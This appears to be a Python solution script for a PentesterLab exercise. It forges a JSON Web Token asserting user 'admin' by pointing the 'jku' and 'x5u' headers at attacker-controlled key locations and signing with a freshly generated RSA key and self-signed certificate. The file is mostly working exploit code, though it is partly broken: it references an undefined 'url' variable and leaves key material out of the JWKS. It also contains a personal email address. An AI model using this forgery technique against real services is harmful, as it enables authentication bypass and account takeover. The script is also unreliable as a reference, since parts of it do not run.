import OpenSSL
from OpenSSL import crypto, SSL
import base64
import json
import datetime
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

key = OpenSSL.crypto.PKey()
key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)

header = {"typ":"JWT","alg":"RS256","jku":"http://ptl-37b1f6d4-c0f8bd20.libcurl.so/79073e6a-fe50-438e-8810-4b5cdd0ce32f.json"}
payload = {"user":"admin"}

jwk = {
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "pentesterlab",
      "alg": "RS256"
    }
  ]
}

priv = key.to_cryptography_key()
pub = priv.public_key()
one_day = datetime.timedelta(1, 0, 0)
cert = crypto.X509()
cert.get_subject().C = "UK"
cert.get_subject().ST = "Surrey"
cert.get_subject().L = "South West"
cert.get_subject().O = "pentesterlab"
cert.get_subject().OU = "pentesterlab"
cert.get_subject().CN = "pentesterlab.com"
cert.get_subject().emailAddress = "elliottdgregory@gmail.com"
cert.set_serial_number(0)
cert.gmtime_adj_notBefore(0)
cert.gmtime_adj_notAfter(10*365*24*60*60)
cert.set_issuer(cert.get_subject())
cert.set_pubkey(key)
cert.sign(key, 'SHA256')

print(OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_TEXT, cert))
#f = open("jwks.json", 'w')
#f.write(json.dumps(jwk))
#f.close()


header = {"typ":"JWT","alg":"RS256"}
header['x5u'] = url
payload = {"user":"admin"}
payload64 = base64.urlsafe_b64encode(bytes(json.dumps(payload), encoding='utf-8')).decode('utf-8').rstrip('=')
header64 = base64.urlsafe_b64encode(bytes(json.dumps(header), encoding='utf-8')).decode('utf-8').rstrip('=')

str = header64+'.'+payload64

sig = priv.sign(bytes(str, encoding='utf-8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15())
print(str+'.'+base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('='))
